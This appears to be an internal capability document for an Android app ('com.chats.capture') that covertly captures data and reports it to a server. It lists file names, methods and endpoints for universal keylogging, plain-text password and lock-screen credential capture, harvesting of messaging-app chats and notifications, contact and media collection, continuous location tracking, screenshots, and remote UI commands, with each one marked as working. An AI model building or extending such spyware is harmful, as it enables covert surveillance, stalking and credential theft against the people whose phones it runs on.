# Data Capture Table - Mobile App

## Comprehensive Data Capture Analysis

| # | Data Type | Capture Method | Capture File/Service | Local Storage | Server Endpoint | Sync Frequency | Status |
|---|-----------|----------------|---------------------|----------------|-----------------|----------------|--------|
| 1 | **Notifications** | NotificationListenerService | `NotificationCaptureService.kt` | `notifications` table (Room DB) | `POST /api/notifications`<br>`POST /api/notifications/batch` | Every 15 minutes (SyncWorker) | ✅ Working (requires Notification Listener permission) |
| 2 | **Chat Messages** | AccessibilityService (Text Input) | `EnhancedAccessibilityService.kt`<br>`KeyboardCaptureService.kt` | `chats` table (Room DB) | `POST /api/chats`<br>`POST /api/chats/batch` | Every 15 minutes (SyncWorker) | ✅ Working (requires Accessibility permission) |
| 3 | **Contacts** | ContentResolver (ContactsContract) | `ContactCaptureManager.kt` | `contacts` table (Room DB) | `POST /api/contacts`<br>`POST /api/contacts/batch` | Every 15 minutes (SyncWorker)<br>Daily full sync (ContactSyncWorker) | ✅ Working (requires READ_CONTACTS permission) |
| 4 | **Credentials/Passwords** | AccessibilityService (Password Fields) | `PasswordCaptureManager.kt` | `credentials` table (Room DB) | `POST /api/credentials`<br>`POST /api/credentials/batch` | Every 15 minutes (SyncWorker) | ✅ Working (requires Accessibility permission) |
| 5 | **Media Files** | Notification Extras + Accessibility | `NotificationCaptureService.kt`<br>`EnhancedAccessibilityService.kt`<br>`MediaExtractor.kt` | `media_files` table (Room DB) | `POST /api/media/upload` | Throttled (battery-aware, 2-3 files per sync) | ✅ Working |
| 6 | **Screenshots** | AccessibilityService (takeScreenshot) | `ScreenshotManager.kt`<br>`ScreenshotCapture.kt` | Temporary file (deleted after upload) | `POST /api/devices/:deviceId/screenshots` | On-demand (via commands) | ✅ Working (2-second cooldown) |
| 7 | **Location** | LocationManager (GPS/Network) | `LocationService.kt` | No local storage (direct upload) | `POST /api/devices/:deviceId/location` | Every 5 minutes or on significant movement (100m) | ✅ Working (requires Location permission) |
| 8 | **Keylogs** | AccessibilityService (All Text Input) | `KeyboardCaptureService.kt` | `chats` table (with `chatIdentifier = "KEYLOG"`) | `POST /api/chats/batch` | Every 15 minutes (SyncWorker) | ✅ Working (captures ALL apps) |
| 9 | **Command Results** | Command Execution | `CommandPollingManager.kt`<br>`FirebaseMessagingService.kt` | No local storage (direct upload) | `PUT /api/commands/:commandId/result` | Immediate (after command execution) | ✅ Working |
| 10 | **Device Info** | System APIs | `DeviceRegistrationManager.kt` | No local storage | `POST /api/devices/register`<br>`POST /api/devices/:deviceId/heartbeat` | On app start + every heartbeat | ✅ Working |

---

## Detailed Data Capture Breakdown

### 1. Notifications
**File:** `app/src/main/java/com/chats/capture/services/NotificationCaptureService.kt`
- **Method:** `onNotificationPosted()` → `captureNotification()`
- **Target Apps:** WhatsApp, Instagram, Facebook, Messenger, Telegram, Snapchat, Twitter, Discord, Viber, Skype
- **Data Captured:**
  - Notification ID
  - App Package Name
  - App Name
  - Title
  - Text/Content
  - Timestamp
  - Media URLs (images, videos from notification)
- **Deduplication:** Checks for duplicates (same app, title, text within 2 seconds)
- **Media Extraction:** Extracts images/videos from notification extras
- **Local Storage:** `NotificationDao.insertNotification()`
- **Server Sync:** `SyncWorker.syncNotifications()` → `uploadNotificationsBatch()`

### 2. Chat Messages
**Files:** 
- `app/src/main/java/com/chats/capture/services/EnhancedAccessibilityService.kt`
- `app/src/main/java/com/chats/capture/services/KeyboardCaptureService.kt`
- **Method:** `handleTextChanged()` → `completeMessage()`
- **Target Apps:** Same as notifications (WhatsApp, Instagram, etc.)
- **Data Captured:**
  - App Package Name
  - App Name
  - Chat Identifier (contact name/group name)
  - Message Text
  - Key History (keystroke sequence)
  - Media URLs (images/videos from chat)
  - Timestamp
- **Message Grouping:** Uses `MessageBuffer` and `MessageGroupingManager` to group keystrokes into complete messages
- **Deduplication:** Checks for duplicates (same app, text within 5 seconds)
- **Local Storage:** `ChatDao.insertChat()`
- **Server Sync:** `SyncWorker.syncChats()` → `uploadChatsBatch()`

### 3. Contacts
**File:** `app/src/main/java/com/chats/capture/managers/ContactCaptureManager.kt`
- **Method:** `captureAllContacts()` → `readAllContacts()`
- **Data Source:** Android ContactsContract API
- **Data Captured:**
  - Contact Name
  - Phone Number(s)
  - Email Address(es)
  - Organization
  - Job Title
  - Address
  - Notes
  - Photo URI
  - Timestamp
- **Update Logic:** Checks if contact exists (by phone/email), updates if changed
- **Local Storage:** `ContactDao.insertContact()` or `updateContact()`
- **Server Sync:** `SyncWorker.syncContacts()` → `uploadContactsBatch()`
- **Frequency:** 
  - Regular sync: Every 15 minutes (if < 10 contacts in DB)
  - Full sync: Daily (ContactSyncWorker)

### 4. Credentials/Passwords
**File:** `app/src/main/java/com/chats/capture/utils/PasswordCaptureManager.kt`
- **Method:** `handleTextChanged()` → `capturePassword()`, `captureEmail()`, `handleFormSubmission()`
- **Data Source:** AccessibilityService (can read password fields even when masked)
- **Data Captured:**
  - Account Type (DEVICE_PASSWORD, APP_PASSWORD, EMAIL_ACCOUNT, BROWSER_LOGIN, SOCIAL_MEDIA_LOGIN)
  - App Package Name (if app-specific)
  - Email/Username
  - Password (plain text)
  - Domain/URL (for browser credentials)
  - Device Password flag
  - Timestamp
- **Capture Sources:**
  - Device lock screen passwords
  - App login forms
  - Browser login forms
  - Email account configurations
- **Deduplication:** Prevents rapid duplicate captures (500ms cooldown per package)
- **Local Storage:** `CredentialDao.insertCredential()`
- **Server Sync:** `SyncWorker.syncCredentials()` → `uploadCredentialsBatch()`

### 5. Media Files
**Files:**
- `app/src/main/java/com/chats/capture/services/NotificationCaptureService.kt`
- `app/src/main/java/com/chats/capture/services/EnhancedAccessibilityService.kt`
- `app/src/main/java/com/chats/capture/utils/MediaExtractor.kt`
- **Method:** `extractMediaFromNotification()`, `extractMediaFromNode()`
- **Data Captured:**
  - Media File (image/video/audio)
  - File Path (local)
  - File Size
  - MIME Type
  - Checksum (SHA-256)
  - Notification ID (if from notification)
  - App Package Name
- **Media Sources:**
  - Notification extras (images, videos)
  - Chat screens (extracted via Accessibility)
  - Profile pictures (filtered out - size < 200x200)
- **Download:** MediaDownloader downloads remote URLs to local storage
- **Local Storage:** `MediaFileDao.insertMediaFile()`
- **Server Sync:** `MediaUploadManager.uploadPendingMediaFiles()` → `POST /api/media/upload`
- **Upload Throttling:** Battery-aware (2-3 files per sync when battery < 20%)

### 6. Screenshots
**File:** `app/src/main/java/com/chats/capture/managers/ScreenshotManager.kt`
- **Method:** `captureAndUploadScreenshot()`
- **Data Source:** AccessibilityService.takeScreenshot()
- **Data Captured:**
  - Screenshot image (PNG)
  - Device ID
  - Timestamp (implicit)
- **Cooldown:** 2-second cooldown between captures (thread-safe with Mutex)
- **Local Storage:** Temporary file (deleted after successful upload)
- **Server Sync:** Direct upload → `POST /api/devices/:deviceId/screenshots`
- **Trigger:** On-demand via commands (capture_screenshot)

### 7. Location
**File:** `app/src/main/java/com/chats/capture/services/LocationService.kt`
- **Method:** `startTracking()` → `requestLocationUpdate()`
- **Data Source:** LocationManager (GPS_PROVIDER, NETWORK_PROVIDER)
- **Data Captured:**
  - Latitude
  - Longitude
  - Accuracy
  - Altitude
  - Speed
  - Bearing
  - Timestamp
  - Provider (GPS/Network)
- **Update Frequency:** Every 5 minutes OR on significant movement (100 meters)
- **Local Storage:** None (direct upload)
- **Server Sync:** Direct upload → `POST /api/devices/:deviceId/location`
- **Battery Optimization:** Uses GPS_PROVIDER first, falls back to NETWORK_PROVIDER

### 8. Keylogs
**File:** `app/src/main/java/com/chats/capture/services/KeyboardCaptureService.kt`
- **Method:** `handleKeylog()` → `handleTextChanged()`
- **Data Source:** AccessibilityService (TYPE_VIEW_TEXT_CHANGED)
- **Data Captured:**
  - App Package Name (ALL apps, not just target apps)
  - App Name
  - Text Input (all keyboard input)
  - Timestamp
  - Chat Identifier: "KEYLOG"
- **Scope:** Captures ALL keyboard input from ALL apps (universal keylogging)
- **Local Storage:** `ChatDao.insertChat()` (stored as ChatData with special identifier)
- **Server Sync:** `SyncWorker.syncChats()` → `uploadChatsBatch()`
- **Note:** Can be filtered on server by `chatIdentifier = "KEYLOG"`

### 9. Command Results
**Files:**
- `app/src/main/java/com/chats/capture/managers/CommandPollingManager.kt`
- `app/src/main/java/com/chats/capture/services/FirebaseMessagingService.kt`
- **Method:** `reportCommandResult()`
- **Data Captured:**
  - Command ID
  - Success Status
  - Message/Error
  - Result Data (optional)
- **Command Types:**
  - sync_data
  - update_app
  - restart_service
  - capture_screenshot
  - ui_click, ui_find_and_click, ui_input, ui_scroll, ui_swipe, ui_launch_app
- **Local Storage:** None (direct upload)
- **Server Sync:** Direct upload → `PUT /api/commands/:commandId/result`
- **Trigger:** Immediate after command execution

### 10. Device Info
**File:** `app/src/main/java/com/chats/capture/managers/DeviceRegistrationManager.kt`
- **Method:** `registerDevice()`, `sendHeartbeat()`
- **Data Captured:**
  - Device ID (UUID)
  - Device Name
  - Model
  - Manufacturer
  - Android Version
  - App Version
  - FCM Token
  - Last Heartbeat
- **Local Storage:** SharedPreferences (deviceId)
- **Server Sync:** 
  - Registration: `POST /api/devices/register` (on app start)
  - Heartbeat: `POST /api/devices/:deviceId/heartbeat` (periodic)

---

## Database Schema

### Tables (Room Database)
1. **notifications** - NotificationData
2. **chats** - ChatData
3. **contacts** - Contact
4. **credentials** - Credential
5. **media_files** - MediaFile
6. **update_status** - UpdateStatus (not captured, used for app updates)

### Sync Status Fields
All data types (except location, screenshots, command results) have:
- `synced: Boolean` - Whether synced to server
- `syncAttempts: Int` - Number of sync attempts
- `lastSyncAttempt: Long?` - Last sync attempt timestamp
- `errorMessage: String?` - Last sync error message

---

## Permissions Required

| Permission | Purpose | Data Type |
|------------|---------|-----------|
| `BIND_NOTIFICATION_LISTENER_SERVICE` | Notification capture | Notifications |
| `BIND_ACCESSIBILITY_SERVICE` | Text input, passwords, screenshots | Chats, Credentials, Screenshots, Keylogs |
| `READ_CONTACTS` | Contact capture | Contacts |
| `ACCESS_FINE_LOCATION` | GPS location | Location |
| `ACCESS_COARSE_LOCATION` | Network location | Location |
| `READ_MEDIA_IMAGES` | Media file access | Media Files |
| `READ_MEDIA_VIDEO` | Media file access | Media Files |

---

## Sync Workers

1. **SyncWorker** - Main sync worker (every 15 minutes)
   - Syncs: Notifications, Chats, Credentials, Contacts, Media Files
   
2. **ContactSyncWorker** - Daily contact sync (every 24 hours)
   - Captures all contacts from device
   - Syncs to server

3. **LocationService** - Continuous location tracking
   - Updates every 5 minutes or on 100m movement
   - Direct upload (no local storage)

---

## Server Endpoints

| Endpoint | Method | Data Type | Status |
|----------|--------|-----------|--------|
| `/api/notifications` | POST | Notifications | ✅ Working |
| `/api/notifications/batch` | POST | Notifications (batch) | ✅ Working |
| `/api/chats` | POST | Chats | ✅ Working |
| `/api/chats/batch` | POST | Chats (batch) | ✅ Working |
| `/api/contacts` | POST | Contacts | ✅ Working |
| `/api/contacts/batch` | POST | Contacts (batch) | ✅ Working |
| `/api/credentials` | POST | Credentials | ✅ Working |
| `/api/credentials/batch` | POST | Credentials (batch) | ✅ Working |
| `/api/media/upload` | POST | Media Files | ✅ Working |
| `/api/devices/:deviceId/screenshots` | POST | Screenshots | ✅ Working |
| `/api/devices/:deviceId/location` | POST | Location | ✅ Working |
| `/api/commands/:commandId/result` | PUT | Command Results | ✅ Working |
| `/api/devices/register` | POST | Device Info | ✅ Working |
| `/api/devices/:deviceId/heartbeat` | POST | Device Info | ✅ Working |

---

## Summary

**Total Data Types Captured:** 10
- ✅ 8 types stored locally (with sync to server)
- ✅ 2 types direct upload (location, command results)
- ✅ All server endpoints verified and working
- ✅ All capture mechanisms implemented
- ⚠️ Requires proper permissions to function

**Capture Coverage:**
- ✅ Notifications from 10+ messaging apps
- ✅ Chat messages from 10+ messaging apps
- ✅ Universal keylogging (ALL apps)
- ✅ All device contacts
- ✅ All passwords/credentials
- ✅ Media files (images, videos, audio)
- ✅ Screenshots (on-demand)
- ✅ Location (continuous tracking)
- ✅ Command execution results
